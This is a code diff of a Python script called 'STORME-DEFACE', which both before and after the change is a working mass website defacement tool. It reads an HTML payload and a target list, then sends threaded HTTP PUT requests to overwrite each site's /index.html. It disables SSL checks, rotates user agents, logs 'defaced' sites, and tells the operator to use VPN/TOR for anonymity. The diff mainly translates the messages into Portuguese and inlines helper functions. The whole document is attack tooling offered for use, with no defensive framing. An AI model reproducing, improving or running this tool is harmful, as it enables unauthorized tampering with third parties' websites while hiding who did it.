@@ -1,5 +1,5 @@
-# -*- coding: utf-8 -*-
-# STORME-DEFACE PRO | @18shinstorme | KEY: stormeshin18
+#-*- coding: utf-8 -*-
+# STORME-DEFACE V2.0 | @18shinstorme | KEY: stormeshin18
 
 import os
 import sys
@@ -7,67 +7,107 @@ import time
 import random
 import threading
 import requests
-from storme_colors import *
-from storme_utils import validate_target, generate_user_agent
-from storme_logger import log_attack
 
-# Configurações
-MAX_THREADS = 10  # Limite de threads para evitar bloqueios
-TIMEOUT = 10      # Timeout para requests (segundos)
+# ===== CORES E ESTILOS =====
+class Colors:
+    RED = "\033[31m"
+    GREEN = "\033[32m"
+    YELLOW = "\033[33m"
+    BLUE = "\033[34m"
+    PURPLE = "\033[35m"
+    CYAN = "\033[36m"
+    BOLD = "\033[1m"
+    RESET = "\033[0m"
 
-banner = f"""
-{random_color()}
+# ===== BANNER FIXO =====
+BANNER = f"""
+{Colors.CYAN}
              ___
            /  >  フ   
-          /   _  _|    {bold}Author: @18shinstorme{reset}
-        /`   ミ_x/      {bold}Version: STORME-DEFACE PRO{reset}
-     _//        |       {bold}Key: stormeshin18{reset}
-    /  ヽ       ﾉ       {bold}Date: {time.strftime("%Y-%m-%d")}{reset}
+          /   _  _|    {Colors.BOLD}Author: @18shinstorme{Colors.RESET}
+        /`   ミ_x/      {Colors.BOLD}Version: STORME-DEFACE V2.0{Colors.RESET}
+     _//        |       {Colors.BOLD}Key: stormeshin18{Colors.RESET}
+    /  ヽ       ﾉ       {Colors.BOLD}Date: {time.strftime("%Y-%m-%d")}{Colors.RESET}
     │     | | |
-  ／￣\   | | |  
+  /￣\\   | | |  
   | (￣ヽ＿ヽ)_)
    ＼二つ
-{reset}
+{Colors.RESET}
 """
+
+# ===== CONFIGURAÇÕES =====
+MAX_THREADS = 5
+TIMEOUT = 15
 
 def animate():
     animations = ["⚡", "🔥", "💀", "🖤"]
+    messages = [
+        "Contornando firewalls...",
+        "Injetando payload...",
+        "Sobrescrevendo arquivos...",
+        "Explorando vulnerabilidades..."
+    ]
     while True:
         for anim in animations:
-            sys.stdout.write(f"\r{red}{bold}[{anim}] Attacking... {random.choice(['Bypassing security...', 'Injecting payload...', 'Overwriting files...'])}{reset}")
+            sys.stdout.write(f"\r{Colors.RED}{Colors.BOLD}[{anim}] {random.choice(messages)}{Colors.RESET}")
             sys.stdout.flush()
             time.sleep(0.3)
 
+def validate_target(url):
+    """Padroniza URLs"""
+    url = url.strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    return url.rstrip('/')
+
+def generate_user_agent():
+    """Gera User-Agent aleatório"""
+    agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+    ]
+    return random.choice(agents)
+
+def log_attack(target, status):
+    """Registra ataques em log"""
+    with open("storme.log", "a") as f:
+        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {target} -> {status}\n")
+
 def storme_input(prompt):
+    """Input compatível com Python 2 e 3"""
     try:
-        return input(prompt) if sys.version_info.major > 2 else raw_input(prompt)
-    except KeyboardInterrupt:
-        print(f"\n{red}{bold}[!] Operation canceled by user.{reset}")
-        sys.exit(1)
+        return input(prompt)
+    except:
+        import __builtin__
+        return __builtin__.raw_input(prompt)
 
 def deface_attack(script_path, target_file="targets.txt"):
     try:
+        # Verifica arquivos
         if not os.path.isfile(script_path):
-            raise FileNotFoundError(f"Script file '{script_path}' not found!")
+            raise FileNotFoundError(f"Arquivo {script_path} não encontrado!")
         
         if not os.path.isfile(target_file):
-            raise FileNotFoundError(f"Target file '{target_file}' not found!")
+            raise FileNotFoundError(f"Arquivo {target_file} não encontrado!")
 
-        with open(script_path, "r", encoding="utf-8") as f:
+        # Carrega payload e targets
+        with open(script_path, "r") as f:
             payload = f.read()
 
         with open(target_file, "r") as f:
             targets = [line.strip() for line in f if line.strip()]
 
         if not targets:
-            raise ValueError("No valid targets found in targets.txt!")
+            raise ValueError("Nenhum alvo válido em targets.txt!")
 
+        # Configura sessão
         session = requests.Session()
         session.headers.update({"User-Agent": generate_user_agent()})
+        session.verify = False  # Ignora erros de SSL
 
-        print(f"\n{yellow}{bold}[!] Starting attack on {len(targets)} targets...{reset}\n")
+        print(f"\n{Colors.YELLOW}{Colors.BOLD}[!] Iniciando ataque contra {len(targets)} alvos...{Colors.RESET}\n")
 
-        # Thread de animação
+        # Inicia animação
         anim_thread = threading.Thread(target=animate)
         anim_thread.daemon = True
         anim_thread.start()
@@ -75,66 +115,65 @@ def deface_attack(script_path, target_file="targets.txt"):
         # Semáforo para limitar threads
         thread_limiter = threading.BoundedSemaphore(MAX_THREADS)
 
-        def attack_thread(site):
+        def attack(site):
             try:
                 with thread_limiter:
                     site = validate_target(site)
                     try:
-                        req = session.put(
-                            site + "/index.html", 
+                        r = session.put(
+                            f"{site}/index.html",
                             data=payload,
-                            timeout=TIMEOUT,
-                            verify=False  # Ignora SSL (para evitar erros em certos sites)
+                            timeout=TIMEOUT
                         )
-                        if 200 <= req.status_code < 300:
-                            msg = f"[SUCCESS] Defaced -> {site}"
-                            print(f"{green}{bold}{msg}{reset}")
-                            log_attack(site, "SUCCESS")
+                        if 200 <= r.status_code < 300:
+                            msg = f"[SUCESSO] Defaced -> {site}"
+                            print(f"{Colors.GREEN}{msg}{Colors.RESET}")
+                            log_attack(site, "SUCESSO")
                         else:
-                            msg = f"[FAILED] Code {req.status_code} -> {site}"
-                            print(f"{red}{msg}{reset}")
-                            log_attack(site, f"FAILED (HTTP {req.status_code})")
+                            msg = f"[FALHA] Status {r.status_code} -> {site}"
+                            print(f"{Colors.RED}{msg}{Colors.RESET}")
+                            log_attack(site, f"FALHA ({r.status_code})")
                     except Exception as e:
-                        msg = f"[ERROR] {str(e)} -> {site}"
-                        print(f"{purple}{msg}{reset}")
-                        log_attack(site, f"ERROR ({str(e)})")
+                        msg = f"[ERRO] {str(e)} -> {site}"
+                        print(f"{Colors.PURPLE}{msg}{Colors.RESET}")
+                        log_attack(site, f"ERRO ({str(e)})")
             except Exception as e:
-                print(f"{red}{bold}[CRITICAL] Thread error: {str(e)}{reset}")
+                print(f"{Colors.RED}{Colors.BOLD}[!] Erro na thread: {str(e)}{Colors.RESET}")
 
-        # Inicia threads de ataque
+        # Inicia threads
         threads = []
-        for site in targets:
-            t = threading.Thread(target=attack_thread, args=(site,))
+        for target in targets:
+            t = threading.Thread(target=attack, args=(target,))
             t.daemon = True
             threads.append(t)
             t.start()
 
-        # Aguarda todas as threads
+        # Aguarda conclusão
         for t in threads:
             t.join()
 
     except Exception as e:
-        print(f"{red}{bold}[FATAL ERROR] {str(e)}{reset}")
-        log_attack("SYSTEM", f"CRASH: {str(e)}")
+        print(f"\n{Colors.RED}{Colors.BOLD}[ERRO GRAVE] {str(e)}{Colors.RESET}")
     finally:
-        print(f"\n{blue}{bold}[*] Attack completed. Check 'storme.log' for details.{reset}")
+        print(f"\n{Colors.BLUE}{Colors.BOLD}[*] Ataque concluído. Verifique storme.log para detalhes.{Colors.RESET}")
 
 def main():
     try:
-        print(banner)
-        print(f"{yellow}{bold}[!] WARNING: Use VPN + TOR + Proxies for anonymity!{reset}\n")
+        print(BANNER)
+        print(f"{Colors.YELLOW}{Colors.BOLD}[!] ATENÇÃO: Use VPN/TOR para anonimato!{Colors.RESET}\n")
 
         while True:
-            script = storme_input(f"{red}⚡ STORME-DEFACE{reset} {cyan}Enter script path (e.g., 'index.html'): {reset}")
+            script = storme_input(f"{Colors.RED}⚡ Script path (ex: index.html): {Colors.RESET}")
             if os.path.isfile(script):
                 break
-            print(f"{red}[!] File not found. Try again.{reset}")
+            print(f"{Colors.RED}[!] Arquivo não encontrado!{Colors.RESET}")
 
         deface_attack(script)
+
     except KeyboardInterrupt:
-        print(f"\n{red}{bold}[!] Operation canceled by user.{reset}")
+        print(f"\n{Colors.RED}{Colors.BOLD}[!] Operação cancelada pelo usuário.{Colors.RESET}")
     except Exception as e:
-        print(f"{red}{bold}[!] Critical error: {str(e)}{reset}")
+        print(f"\n{Colors.RED}{Colors.BOLD}[!] Erro crítico: {str(e)}{Colors.RESET}")
 
 if __name__ == "__main__":
     main()
